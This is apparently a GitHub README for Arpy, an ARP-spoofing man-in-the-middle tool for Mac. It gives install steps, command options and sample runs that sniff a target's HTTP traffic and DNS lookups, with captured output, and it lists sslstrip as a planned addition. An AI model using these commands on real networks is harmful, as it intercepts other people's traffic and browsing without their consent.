![alt text][logo]

[logo]: https://github.com/ivanvza/arpy/blob/master/images/logo.png "Logo"
# Arpy
Arpy is an easy-to-use [ARP](https://tools.ietf.org/html/rfc826) spoofing MiTM tool for Mac.
It provides 3 targeted functions:
* Packet Sniffing
* Visited Domains
* Visited Domains with [Gource](https://code.google.com/p/gource/)

###### Each function will be explained below.

### Tested OS (to date)
* Darwin 14.3.0 Darwin Kernel Version 14.3.0 (Mac OS X)

## Requirements
* Python 2.7
* Gource
* Scapy
* libdnet

## Installation
#### Gource
```
brew install gource
```
#### Scapy
```
pip install scapy
```
#### libdnet
```

$ git clone https://github.com/dugsong/libdnet.git
$ cd libdnet
$ ./configure && make && make install
cd python
python setup.py install
```

## Sample Commands
```
ivanvza:~/ > sudo arpy
     _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
    v3.15 -@viljoenivan

Usage: arpy -t <Target IP> -g <Gateway IP> -i <Interface>

ARP MiTM Tool

Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        The Target IP
  -g GATEWAY, --gateway=GATEWAY
                        The Gateway
  -i INTERFACE, --interface=INTERFACE
                        Interface to use
  --tcp                 Filters out only tcp traffic
  --udp                 Filters out only udp traffic
  -d D_PORT, --destination_port=D_PORT
                        Filter for a destination port
  -s S_PORT, --source_port=S_PORT
                        Filter for a source port
  --sniff               Sniff all passing data
  --sniff-dns           Sniff only searched domains
  --sniff-dns-gource    Output target's DNS searches in gource format
  -v                    Verbose scapy packet print
```

## Packet Sniff
This is the packet sniffer, it allows you to see your target's traffic.
```
ivanvza:~/ > sudo arpy -t 192.168.1.3 -g 192.161.1.1 -i en0 --sniff
     _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
    v3.15 -@viljoenivan


  [Info] Starting Sniffer...

[Info] Enabling IP Forwarding...
[Info] Filter: ((src host 192.168.1.3 or dst host 192.168.1.3))

[Info] Found the following (IP layer): 192.168.1.3 -> 46.101.34.90
GET / HTTP/1.1
User-Agent: curl/7.37.1
Host: ivanvza.ninja
Accept: */*



[Info] Found the following (IP layer): 46.101.34.90 -> 192.168.1.3
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "2719538271"
Last-Modified: Thu, 30 Apr 2015 08:25:15 GMT
Content-Length: 3213
Date: Fri, 29 May 2015 20:15:06 GMT
Server: Microsoft IIS

<html>
     <title>><></title>
    <body>
        <pre style="line-height: 1.25; white-space: pre;">
        \          SORRY            /
         \                         /
          \    This page does     /
           ]   not exist yet.    [    ,'|
           ]                     [   /  |
           ]___               ___[ ,'   |
           ]  ]\             /[  [ |:   |
           ]  ] \           / [  [ |:   |
           ]  ]  ]         [  [  [ |:   |
           ]  ]  ]__     __[  [  [ |:   |
           ]  ]  ] ]\ _ /[ [  [  [ |:   |
           ]  ]  ] ] (#) [ [  [  [ :===='
           ]  ]  ]_].nHn.[_[  [  [
           ]  ]  ]  HHHHH. [  [  [
           ]  ] /   `HH("N  \ [  [
           ]__]/     HHH  "  \[__[
           ]         NNN         [
           ]         N/"         [
           ]         N H         [
          /          N            \
         /           q,            \
        /                           \
        </pre>
        <h3 id="list"><h3>
    </body>
<script>

// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
var RTCPeerConnection = /*window.RTCPeerConnection ||
```
## DNS Sniff
This function allows you to see domain names that your target is currently requesting.
```
ivanvza:~/ > sudo arpy -t 192.168.1.4 -g 192.168.1.1 -i en0 --sniff-dns
     _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
         - @viljoenivan


  [Info] Starting DNS Sniffer...

[Info] Enabling IP Forwarding...
[Info] Done...
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: www.youtube.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: s2.googleusercontent.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: google.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: s.ytimg.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: fonts.gstatic.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: yt3.ggpht.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: i.ytimg.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: safebrowsing.google.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: safebrowsing-cache.google.com.
Target: 192.168.1.4 -> (192.168.1.1/DNS server) has searched for: safebrowsing-cache.google.com.
```
## DNS Sniff With Gource
This function is more or less the same as the above, however it provides the functionality to pass it through Gource to get a live feed of what your target is viewing.
```
ivanvza:~/ > sudo arpy -t 192.168.1.3 -g 192.161.1.1 -i en0 --sniff-dns-gource
[INFO] For a live gource feed run this command in parallel with this one:

tail -f /tmp/36847parsed_nmap | tee /dev/stderr | gource -log-format custom -a 1 --file-idle-time 0 -

[Info] Filter: ((src host 192.168.1.3 or dst host 192.168.1.3) and dst port 53)
```
### Sample Gource footage
![alt text][gourve_live_footage]

[gourve_live_footage]: https://github.com/ivanvza/arpy/blob/master/images/arpy_gource.gif "Live Gource Footage"

### Contact
@viljoenivan

### To-do
* Look at adding sslstrip.
* Port it too kali.
